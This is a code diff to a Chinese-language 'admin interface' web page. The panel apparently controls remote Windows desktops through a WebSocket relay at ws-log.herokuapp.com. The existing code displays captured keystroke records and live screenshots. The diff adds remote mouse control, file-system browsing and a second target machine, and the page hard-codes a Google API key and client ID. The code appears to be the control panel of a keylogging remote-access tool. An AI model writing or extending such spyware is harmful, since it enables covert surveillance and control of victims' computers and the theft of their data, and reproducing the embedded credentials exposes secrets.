@@ -4,6 +4,24 @@
     <title>管理介面</title>
     <meta charset="utf-8" />
     <meta HTTP-EQUIV="EXPIRES" CONTENT="Mon, 22 Jul 2002 11:12:01 GMT">
+    <script type="text/javascript" src="js/jquery-3.6.1.min.js"></script>
+    <style>
+        #treeView  {
+            float: left
+        }
+
+        #screenView  {
+            float: right
+        }
+
+        .xicon {
+            float: left
+        }
+
+        .xname {
+            float: right
+        }
+    </style>
   </head>
   <body>
     <p>管理介面</p>
@@ -15,15 +33,19 @@
     <pre id="content" style="white-space: pre-wrap;"></pre>
 
     <hr>
-    <img id="screen" width="640">
+    <div id="wrap">
+        <div id="treeView">
+            <div id="tree"></div>
+        </div>
+        <div id="screenView">
+            <img id="screen" style="width:1080px;text-align:left">
+        </div>
+    </div>
+    
     <div id="keyRecord">
 
     </div>
-
-    <canvas></canvas>
-
-    <script type="text/javascript" src="jquery-3.6.1.min.js"></script>
-    <script type="text/javascript" src="peerjs.min.js"></script>
+    
     <script type="text/javascript">
         const CLIENT_ID = '366215724019-qqo1q5nlos02ac5ii4a55sfqqrs04tsl.apps.googleusercontent.com';
         const API_KEY = 'AIzaSyCBywDDiNawTCa4fXeO6teysyZxtaNaUgg';
@@ -41,23 +63,85 @@
         document.getElementById('signout_button').style.visibility = 'hidden';
 
         let rnd_id = uuidv4();
-        /*
-        console.log(rnd_id);
-        let peer = new Peer(rnd_id, {
-            host: 'localhost',
-            port: 8000,
-            path: '/myapp',
-            debug: 3
-        });
-        peer.on('call', function(call) {
-            const canvasElt = document.querySelector('canvas');
-            const stream = canvasElt.captureStream(25); // 25 FPS
-            call.answer(stream);
-            call.on('stream', function(remoteStream) {
-                console.log("on stream");
-            });
-        });
-        */
+        
+        var screenImg = document.getElementById("screen");
+        screenImg.onmousemove = moveTrigger;
+        screenImg.onmousedown = timerTrigger;
+        screenImg.onmouseup = clickTrigger;
+        
+        window.addEventListener('contextmenu', (event) => {
+            event.preventDefault()
+        })
+
+        function findPosition(oElement){
+            if(typeof( oElement.offsetParent ) != "undefined"){
+                for(var posX = 0, posY = 0; oElement; oElement = oElement.offsetParent){
+                    posX += oElement.offsetLeft;
+                    posY += oElement.offsetTop;
+                }
+                return [ posX, posY ];
+            }
+            else
+            {
+                return [ oElement.x, oElement.y ];
+            }
+        }
+
+        let downTimer = null;
+
+        function timerTrigger(e) {
+            downTimer = new Date();
+        }
+
+        function moveTrigger(e) {
+            let pos = getCoordinates(e);
+            send(userId + "," + pos.x + "," + pos.y, "SET_CURSOR");
+        }
+
+        function clickTrigger(e) {
+            let upTimer = new Date();
+            let diffMs = (upTimer - downTimer);
+            let pos = getCoordinates(e);
+            if(diffMs > 500 || e.button == 2) {
+                send(userId + "," + pos.x + "," + pos.y, "RIGHT_CLICK");
+                console.log("Right Click");
+            } else {
+                send(userId + "," + pos.x + "," + pos.y, "LEFT_CLICK");
+                console.log("Left Click");
+            }
+        }
+
+        function getCoordinates(e){
+            var PosX = 0;
+            var PosY = 0;
+            var ImgPos;
+            ImgPos = findPosition(screenImg);
+            if (!e) var e = window.event;
+            if (e.pageX || e.pageY)
+            {
+                PosX = e.pageX;
+                PosY = e.pageY;
+            }
+            else if (e.clientX || e.clientY)
+                {
+                PosX = e.clientX + document.body.scrollLeft
+                    + document.documentElement.scrollLeft;
+                PosY = e.clientY + document.body.scrollTop
+                    + document.documentElement.scrollTop;
+                }
+            PosX = PosX - ImgPos[0];
+            PosY = PosY - ImgPos[1];
+
+            let nWidth = screenImg.naturalWidth;
+            let width = screenImg.clientWidth;
+            let ration = nWidth / width;
+            let mx = Math.round(PosX * ration);
+            let my = Math.round(PosY * ration);
+            return {
+                x: mx,
+                y: my
+            }
+        }
 
         function gapiLoaded() {
             gapi.load('client', initializeGapiClient);
@@ -116,6 +200,46 @@
             }
         }
 
+        function send(data,cmd) {
+            try {
+                socket.send(rnd_id + ":" + cmd + ":" + data);
+            } catch (e) {
+                console.log(e);
+            }
+        }
+
+        function addFolder(folderName, path) {
+            let folder = document.createElement("div");
+            folder.className = "folder";
+            let icon = document.createElement("img");
+            icon.src = "images/folder-closed.gif";
+            icon.className = "xicon";
+            let name = document.createElement("div");
+            name.className = "xname";
+            name.innerText = folderName;
+            folder.appendChild(icon);
+            folder.appendChild(name);
+            let br = document.createElement("br");
+            folder.appendChild(br);
+            document.getElementById("tree").appendChild(folder);
+        }
+
+        function addFile(fileName, path) {
+            let file = document.createElement("div");
+            file.className = "folder";
+            let icon = document.createElement("img");
+            icon.src = "images/file.gif";
+            icon.className = "xicon";
+            let name = document.createElement("div");
+            name.className = "xname";
+            name.innerText = fileName;
+            file.appendChild(icon);
+            file.appendChild(name);
+            let br = document.createElement("br");
+            file.appendChild(br);
+            document.getElementById("tree").appendChild(file);
+        }
+
         function connect() {
             socket = new WebSocket("wss://ws-log.herokuapp.com");
             socket.onmessage = function(e) {
@@ -129,6 +253,17 @@
                         $("#keyRecord").append(val);
                     } else if(cmd == "screen") {
                         $("#screen").attr("src", "data:image/png;base64, " + val);
+                    } else if(cmd == "file_system") {
+                        let allFiles = val.split(",");
+                        console.log(data);
+                        for(let i=0;i<allFiles.length;i++){
+                            let file = allFiles[i].split("|");
+                            if(file[1] == "FOLDER") {
+                                addFolder(file[0]);
+                            } else {
+                                addFile(file[0]);
+                            }
+                        }
                     }
                 }
             };
@@ -159,6 +294,10 @@
                 id: "DESKTOP-8TT1UPH",
                 name: "DESKTOP-8TT1UPH"
             });
+            files.push({
+                id: "DESKTOP-F212NBT",
+                name: "DESKTOP-F212NBT"
+            });
             let output = "<h2>請選擇使用者名稱</h2>";
             for(let i=0;i<files.length;i++) {
                 output+= "<button onclick=\"showUser('" + files[i].id + "')\">" + files[i].name + "</button>";
@@ -184,7 +323,10 @@
         function showUser(uid) {
             $("#keyRecord").html("");
             userId = uid;
-            //showScreen(uid);
+            $("#screen").attr("src", "");
+            $("#tree").html("");
+            send(userId, "SCREEN_START");
+            send(userId + ",ROOT", "SHOW_FOLDER");
         }
 
         function uuidv4() {
